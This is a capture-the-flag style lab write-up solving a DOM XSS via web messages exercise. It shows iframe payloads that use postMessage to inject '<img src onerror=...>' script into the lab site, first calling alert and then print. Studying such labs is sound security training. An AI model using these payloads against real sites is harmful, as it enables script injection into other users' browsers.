# Lab: DOM XSS using web messages

This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the print() function to be called. 

# Step 1 Find web message

On the main page of the script, I find a web message that is going to be used for future adds

![image](https://user-images.githubusercontent.com/83407557/211449086-6918e804-6d67-4985-a295-cfcb4af0b844.png)


# Step 2 Create a malicious iframe on a server I control

I can post a web message from a server I control using an iframe:

```html
<iframe src="https://0abf009603fae835c1ab68ef00910092.web-security-academy.net/" onload="this.contentWindow.postMessage('HACKED!','*')">
```

![image](https://user-images.githubusercontent.com/83407557/211449265-81a046eb-98ed-488c-b80e-b2ffeb5c8b31.png)

Viewing the iframe, I see that I can manipulate data on the target website:

![image](https://user-images.githubusercontent.com/83407557/211449442-0591dac9-6899-4fed-945b-784405aab464.png)


# Step 3 Have iframe execute javascript

In addition to having a string injected into the page, I can also inject javascript code. To call an print function I edit the iframe:

```html
<iframe src="https://0abf009603fae835c1ab68ef00910092.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src onerror=alert(document.domain)>','*')">
```
![image](https://user-images.githubusercontent.com/83407557/211451548-ca057e24-2e37-4dfa-ac5d-473db74488b6.png)

![image](https://user-images.githubusercontent.com/83407557/211451597-8f042539-e07a-44c6-ad01-aba324981b24.png)

# Step 4 modify xss to call print function

```html
<iframe src="https://0abf009603fae835c1ab68ef00910092.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src onerror=print()>','*')">
```
![image](https://user-images.githubusercontent.com/83407557/211451840-2ce1d414-9011-448b-8da4-24559651064d.png)

Having a working POC, I send it to the victim:

![image](https://user-images.githubusercontent.com/83407557/211451936-2b3ac3ff-b43f-4719-9cbb-73ae9794c81e.png)

which solves the lab

![image](https://user-images.githubusercontent.com/83407557/211451971-6dd23399-3b0a-40e6-bfa7-3fd4323a82e2.png)

